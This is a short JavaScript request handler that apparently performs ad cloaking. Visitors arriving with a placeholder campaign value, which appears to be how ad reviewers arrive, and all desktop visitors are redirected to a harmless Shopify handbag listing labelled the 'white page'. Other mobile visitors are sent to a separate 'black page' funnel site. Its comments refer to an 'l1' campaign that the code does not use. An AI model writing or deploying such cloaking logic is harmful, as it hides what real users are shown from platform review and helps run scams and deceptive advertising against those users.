export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://endbag.myshopify.com/products/womens-clutch-wallet-evening-bag-with-attachable-chain-shoulder-strap?pr_prod_strat=collection_fallback&pr_rec_id=d76fe8280&pr_rec_pid=4592700031114&pr_ref_pid=4592668016778&pr_seq=uniform";
    const blackPageURL = "https://adffuaorrd.myfunnelish.com/imbassd-1736979042571105-1737989463763779";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
